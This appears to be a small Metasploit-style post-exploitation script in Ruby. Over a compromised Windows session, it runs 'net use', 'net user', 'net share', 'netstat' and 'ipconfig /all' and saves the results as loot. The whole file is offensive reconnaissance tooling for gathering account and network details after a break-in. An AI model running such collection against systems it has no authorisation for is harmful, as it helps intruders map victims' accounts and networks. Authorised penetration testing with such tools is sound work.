##
# $Id$
##

#
# Collect the system name file from the machine on the other end of the session.
#

print_status("Collecting the system information data.")

data = ''

#
# Get system information
#

cmd = "net use & net user & net share & netstat -na & ipconfig /all"

output = client.shell_command_token_win32(cmd)
if (output)
	data << output
end


#
# Store what we found
#
if (data.length > 0)
	pro.store_loot("host.windows.network", "text/plain", client, data.strip)
end

